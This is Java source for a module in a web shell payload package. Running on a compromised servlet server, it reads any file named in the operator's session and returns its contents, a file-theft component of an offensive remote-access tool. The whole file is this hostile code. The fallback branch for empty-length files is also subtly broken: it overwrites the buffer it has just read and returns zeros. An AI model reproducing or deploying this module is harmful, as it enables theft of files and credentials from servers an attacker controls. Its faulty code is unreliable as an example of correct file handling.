package shells.payloads.java.modules;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.util.Map;

public class ReadFileModule {
    private Map session;
    private Object servletRequest;

    private String getString(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        if (value instanceof byte[]) {
            return new String((byte[])value);
        }
        return value != null ? value.toString() : null;
    }

    private static byte[] readInputStream(InputStream inputStream, int len) throws Exception {
        byte[] data = new byte[len];
        int readOneLen = 0;

        while((readOneLen += inputStream.read(data, readOneLen, data.length - readOneLen)) < data.length) {
        }

        return data;
    }

    public void setSession(Map session) {
        this.session = session;
    }

    public void setServletRequest(Object servletRequest) {
        this.servletRequest = servletRequest;
    }

    public byte[] execute() {
        String fileName = this.getString("fileName");
        if (fileName != null) {
            File file = new File(fileName);

            try {
                if (file.exists() && file.isFile()) {
                    if (file.length() > 204800L) {
                        return "The file is too large, please use the large file to download".getBytes();
                    } else {
                        byte[] out = new byte[(int)file.length()];
                        FileInputStream fis;
                        if (out.length > 0) {
                            fis = new FileInputStream(file);
                            out = readInputStream(fis, out.length);
                            fis.close();
                        } else {
                            out = new byte[204800];
                            fis = new FileInputStream(file);
                            int n = fis.read(out);
                            if (n > 0) {
                                out = new byte[n];
                                System.arraycopy(out, 0, out, 0, out.length);
                            }

                            fis.close();
                        }

                        return out;
                    }
                } else {
                    return "file does not exist".getBytes();
                }
            } catch (Exception e) {
                return e.getMessage().getBytes();
            }
        } else {
            return "No parameter fileName".getBytes();
        }
    }

    public String getModuleName() {
        return "readFile";
    }
}
